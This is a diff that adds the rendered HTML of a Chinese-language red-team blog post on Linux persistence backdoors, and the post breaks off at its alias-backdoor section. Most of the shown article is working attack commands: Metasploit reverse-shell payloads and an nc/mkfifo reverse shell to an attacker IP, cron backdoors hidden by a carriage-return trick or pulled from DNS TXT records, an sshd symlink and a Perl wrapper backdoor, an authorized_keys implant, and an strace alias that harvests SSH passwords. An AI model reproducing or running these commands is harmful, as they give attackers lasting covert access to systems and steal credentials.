@@ -1,37 +1,394 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-{% block page_class %}page-post-detail{% endblock %}
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block content %}
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文记录Linux环境下权限维持思路及方法...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持Linux后门篇">
+<meta property="og:url" content="https://l0n9w4y.cc/posts/20809/index.html">
+<meta property="og:site_name" content="L0n9w4y">
+<meta property="og:description" content="本文记录Linux环境下权限维持思路及方法...">
+<meta property="og:locale">
+<meta property="article:published_time" content="2022-01-02T13:30:14.000Z">
+<meta property="article:modified_time" content="2022-09-03T07:56:03.291Z">
+<meta property="article:author" content="L0n9w4y">
+<meta property="article:tag" content="Persistence">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://l0n9w4y.cc/posts/20809/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-Hans","comments":true,"permalink":"https://l0n9w4y.cc/posts/20809/","path":"posts/20809/","title":"权限维持Linux后门篇"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>权限维持Linux后门篇 | L0n9w4y</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">L0n9w4y</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-攻防"><a href="/security/" rel="section"><i class="fa fa-navicon fa-fw"></i>攻防</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Metasploit"><span class="nav-number">1.</span> <span class="nav-text">0x01 Metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Unix-%E4%B8%AD%E5%8F%8D%E5%BC%B9shell%E7%9A%84paylaod"><span class="nav-number">1.1.</span> <span class="nav-text">1. Unix 中反弹shell的paylaod</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-msfvenom-%E7%94%9F%E6%88%90payload"><span class="nav-number">1.2.</span> <span class="nav-text">2. msfvenom 生成payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-meterpreter-shell"><span class="nav-number">1.3.</span> <span class="nav-text">3. meterpreter shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="nav-number">2.</span> <span class="nav-text">0x02 计划任务后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%9F%A5%E6%89%BE%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6"><span class="nav-number">2.1.</span> <span class="nav-text">1. 查找计划任务相关文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%96%87%E4%BB%B6%E8%AF%B4%E6%98%8E"><span class="nav-number">2.2.</span> <span class="nav-text">2. 定时任务文件说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8"><span class="nav-number">2.3.</span> <span class="nav-text">3. 计划任务隐藏后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-SSH%E7%B3%BB%E5%88%97%E5%90%8E%E9%97%A8"><span class="nav-number">3.</span> <span class="nav-text">0x03 SSH系列后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BD%AF%E9%93%BE%E6%8E%A5%E5%90%8E%E9%97%A8"><span class="nav-number">3.1.</span> <span class="nav-text">1. 软链接后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SSH-Wapper-%E5%90%8E%E9%97%A8"><span class="nav-number">3.2.</span> <span class="nav-text">2. SSH Wapper 后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-SSH%E5%85%AC%E9%92%A5%E5%90%8E%E9%97%A8"><span class="nav-number">3.3.</span> <span class="nav-text">3. SSH公钥后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-SSH-Keylogger"><span class="nav-number">3.4.</span> <span class="nav-text">4. SSH Keylogger</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-alias%E5%90%8E%E9%97%A8"><span class="nav-number">4.</span> <span class="nav-text">0x04 alias后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%90%8E%E9%97%A8%E5%AD%98%E6%94%BE%E4%BD%8D%E7%BD%AE"><span class="nav-number">4.1.</span> <span class="nav-text">1. 后门存放位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%90%8E%E9%97%A8%E5%88%B6%E4%BD%9C"><span class="nav-number">4.2.</span> <span class="nav-text">2. 后门制作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%90%8E%E9%97%A8%E9%9A%90%E8%97%8F"><span class="nav-number">4.3.</span> <span class="nav-text">3. 后门隐藏</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-vim%E5%90%8E%E9%97%A8"><span class="nav-number">5.</span> <span class="nav-text">0x05 vim后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-LD-PRELOAD-%E5%90%8E%E9%97%A8"><span class="nav-number">6.</span> <span class="nav-text">0x06 LD_PRELOAD 后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%9A%90%E8%97%8F"><span class="nav-number">6.1.</span> <span class="nav-text">环境变量隐藏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="nav-number">6.2.</span> <span class="nav-text">利用工具</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">L0n9w4y</p>
+  <div class="site-description" itemprop="description">攻防对抗，問道遠兮，求索未止...</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/L0n9w4y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0n9w4y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/l0n9w4y" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;l0n9w4y" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/_L0n9_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;_L0n9_" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/20809/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="L0n9w4y">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L0n9w4y">
+      <meta itemprop="description" content="攻防对抗，問道遠兮，求索未止...">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="权限维持Linux后门篇 | L0n9w4y">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          权限维持Linux后门篇
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-01-02 21:30:14" itemprop="dateCreated datePublished" datetime="2022-01-02T21:30:14+08:00">2022-01-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-09-03 15:56:03" itemprop="dateModified" datetime="2022-09-03T15:56:03+08:00">2022-09-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">红队渗透</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <center>本文记录Linux环境下权限维持思路及方法...</center>
+
+<span id="more"></span>
+<hr>
+<h2 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h2><h3 id="1-Unix-中反弹shell的paylaod"><a href="#1-Unix-中反弹shell的paylaod" class="headerlink" title="1. Unix 中反弹shell的paylaod"></a>1. Unix 中反弹shell的paylaod</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep &#x27;cmd/unix/reverse&#x27;</span><br><span class="line"></span><br><span class="line">    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK</span><br><span class="line">    cmd/unix/reverse_bash                               Creates an interactive shell via bash&#x27;s builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.</span><br><span class="line">    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the &#x27;-z&#x27; option included on some systems to encrypt using SSL.</span><br><span class="line">    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash&#x27;s builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.</span><br><span class="line">    cmd/unix/reverse_jjs                                Connect back and create a command shell via jjs</span><br><span class="line">    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#x27;t usually installed by default.</span><br><span class="line">    cmd/unix/reverse_lua                                Creates an interactive shell via Lua</span><br><span class="line">    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode</span><br><span class="line">    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs</span><br><span class="line">    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_perl                               Creates an interactive shell via perl</span><br><span class="line">    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL</span><br><span class="line">    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL</span><br><span class="line">    cmd/unix/reverse_python                             Connect back and create a command shell via Python</span><br><span class="line">    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.</span><br><span class="line">    cmd/unix/reverse_r                                  Connect back and create a command shell via R</span><br><span class="line">    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby</span><br><span class="line">    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL</span><br><span class="line">    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat</span><br><span class="line">    cmd/unix/reverse_ssh                                Connect back and create a command shell via SSH</span><br><span class="line">    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option</span><br><span class="line">    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)</span><br><span class="line">    cmd/unix/reverse_tclsh                              Creates an interactive shell via Tclsh</span><br><span class="line">    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#x27;t usually installed by default</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-msfvenom-生成payload"><a href="#2-msfvenom-生成payload" class="headerlink" title="2. msfvenom 生成payload"></a>2. msfvenom 生成payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br><span class="line"></span><br><span class="line">msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure>
+
+<p>refer: <a target="_blank" rel="noopener" href="https://gitee.com/l0n9/sec-notes/blob/master/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/Metsploit%E5%9F%BA%E7%A1%80%E7%AF%87.md">https://gitee.com/l0n9/sec-notes/blob/master/Metsploit</a></p>
+<h3 id="3-meterpreter-shell"><a href="#3-meterpreter-shell" class="headerlink" title="3. meterpreter shell"></a>3. meterpreter shell</h3><p>shell升级为 meterpreter shell</p>
+<p>攻击机配置msf 监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload linux/x86/shell/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lport 6666</span><br><span class="line"></span><br><span class="line">set lhost 192.168.1.1</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>目标主机上反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.1.1 6666 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>获取一个普通shell, 在这个shell中输入 background, 在对话中选择 y, 将shell放在了后台</p>
+<p>使用 sessions -u 1 将普通shell提升为 meterpreter shell</p>
+<p>sessions命令查看shell会话，sessions -i id 切换到目标shell</p>
+<h2 id="0x02-计划任务后门"><a href="#0x02-计划任务后门" class="headerlink" title="0x02 计划任务后门"></a>0x02 计划任务后门</h2><h3 id="1-查找计划任务相关文件"><a href="#1-查找计划任务相关文件" class="headerlink" title="1. 查找计划任务相关文件"></a>1. 查找计划任务相关文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) sudo find / -name &#x27;cron*&#x27; | egrep -v &#x27;man|doc&#x27; | sort -u</span><br><span class="line"></span><br><span class="line">2) sudo updatedb &amp;&amp; sudo locate cron | egrep -v &#x27;doc|man&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-定时任务文件说明"><a href="#2-定时任务文件说明" class="headerlink" title="2. 定时任务文件说明"></a>2. 定时任务文件说明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1) 用户允许/禁止配置文件</span><br><span class="line"></span><br><span class="line">- /etc/cron.deny ：用来禁止一些用户使用cron服务的配置文件</span><br><span class="line"></span><br><span class="line">- /etc/cron.allow ：允许一些用户来使用cron服务的配置文件，优先级高</span><br><span class="line"></span><br><span class="line">2) 系统配置项：系统执行的计划任务</span><br><span class="line"></span><br><span class="line">- /etc/crontab </span><br><span class="line"></span><br><span class="line">- /etc/cron.d/</span><br><span class="line"></span><br><span class="line">3) 用户配置项：执行crontab命令操作的目录</span><br><span class="line"></span><br><span class="line">- /var/spool/cron</span><br><span class="line"></span><br><span class="line">4) 其他计划任务文件</span><br><span class="line"></span><br><span class="line">    /etc/cron.daily</span><br><span class="line">    /etc/cron.deny</span><br><span class="line">    /etc/cron.hourly</span><br><span class="line">    /etc/cron.monthly</span><br><span class="line">    /etc/cron.weekly</span><br></pre></td></tr></table></figure>
+
+<p>定时任务在线生成器：<a target="_blank" rel="noopener" href="https://crontab.guru/">https://crontab.guru/</a></p>
+<h3 id="3-计划任务隐藏后门"><a href="#3-计划任务隐藏后门" class="headerlink" title="3. 计划任务隐藏后门"></a>3. 计划任务隐藏后门</h3><p>隐藏思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) 不使用用户cron配置项：避免crontab命令查看计划任务内容</span><br><span class="line"></span><br><span class="line">2) 不使用常用目录及文件如：/var/spool/cron、/etc/crontab等</span><br><span class="line"></span><br><span class="line">3) 劫持/修改系统默认的计划任务文件：伪装文件名/文件位置</span><br><span class="line"></span><br><span class="line">如：/etc/cron.daily 、/etc/cron.hourly目录下自带文件</span><br></pre></td></tr></table></figure>
+
+<p>隐藏技巧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) 巧妙利用windows中的 \r（ Linux 中显示为M), 导致显示截断，从而隐藏真实的计划任务，使用crontab -e 可以看到</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * /root/.devops.sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br><span class="line"></span><br><span class="line">2) 使用DNS的TXT记录，通过解析这个记录来进行执行，使用linux.org等公共域名进行隐藏</span><br><span class="line"></span><br><span class="line">0 1 * * * /bin/sh -c &quot;sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>refer：<a target="_blank" rel="noopener" href="https://blog.sucuri.net/2019/05/cronjob-backdoors.html">https://blog.sucuri.net/2019/05/cronjob-backdoors.html</a></p>
+<h2 id="0x03-SSH系列后门"><a href="#0x03-SSH系列后门" class="headerlink" title="0x03 SSH系列后门"></a>0x03 SSH系列后门</h2><h3 id="1-软链接后门"><a href="#1-软链接后门" class="headerlink" title="1. 软链接后门"></a>1. 软链接后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=6666;</span><br><span class="line"></span><br><span class="line">ssh root@x.x.x.x -p 6666</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-SSH-Wapper-后门"><a href="#2-SSH-Wapper-后门" class="headerlink" title="2. SSH Wapper 后门"></a>2. SSH Wapper 后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin</span><br><span class="line">vim sshd //编辑sshd内容为以下</span><br><span class="line"></span><br><span class="line">#!/usr/bin/perl</span><br><span class="line">exec&quot;/bin/sh&quot; if(getpeername(STDIN)=~/^..0V/); // \x00\x000V是22222的大端形式</span><br><span class="line">exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;</span><br><span class="line"></span><br><span class="line">重启sshd</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">本机执行</span><br><span class="line">socat STDIO TCP4:127.0.0.1:22,sourceport=22222</span><br><span class="line"></span><br><span class="line">修改源端口</span><br><span class="line">import struct</span><br><span class="line">buffer = struct.pack(&#x27;&gt;I&#x27;,22222)</span><br><span class="line">print(buffer)</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-SSH公钥后门"><a href="#3-SSH公钥后门" class="headerlink" title="3. SSH公钥后门"></a>3. SSH公钥后门</h3><p>攻击机中使用 ssh-keygen -t rsa 生成公私钥</p>
+<p>将公钥 id_rsa.pub 上传到目标主机，保存为 ~&#x2F;.ssh&#x2F;authorized_keys</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@host</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-SSH-Keylogger"><a href="#4-SSH-Keylogger" class="headerlink" title="4. SSH Keylogger"></a>4. SSH Keylogger</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 利用strace工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read.write.connect -s 2048 ssh&#x27;</span><br><span class="line"></span><br><span class="line">grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-alias后门"><a href="#0x04-alias后门" class="headerlink" title="0x04 alias后门"></a>0x04 alias后门</h2><h3 id="1-后门存放位置"><a href="#1-后门存放位置" class="headerlink" title="1. 后门存放位置"></a>1. 后门存放位置</h3><p>系统启动默认加载的配置文件</p>
